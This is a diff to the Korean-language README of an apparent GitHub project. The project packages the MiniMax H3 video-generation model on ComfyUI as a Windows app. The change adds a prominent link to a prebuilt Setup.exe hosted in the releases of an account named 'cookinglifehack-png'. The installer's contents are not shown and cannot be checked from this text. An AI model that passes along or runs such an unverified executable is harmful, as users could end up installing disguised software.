@@ -2,6 +2,8 @@
 
 [English](README.md) | [日本語](README.ja.md) | [中文](README.zh.md) | **한국어** | [Deutsch](README.de.md) | [Español](README.es.md) | [Bahasa Indonesia](README.id.md)
 
+### ⬇️ [설치 프로그램 다운로드 (Windows)](https://github.com/cookinglifehack-png/MiniMax-H3-HACK-Studio/releases/latest/download/MiniMax_H3_HACK_Studio_Setup.exe)
+
 ComfyUI 위에서 동작하는 동영상 생성 모델 **MiniMax H3**를, 설치만 하면 바로 쓸 수
 있는 Windows 앱으로 만들었습니다. ComfyUI 워크플로 편집도, PHP 지식도 필요
 없습니다——더블클릭으로 실행한 뒤, 브라우저 폼을 다루듯 조작만으로 T2V・I2V・
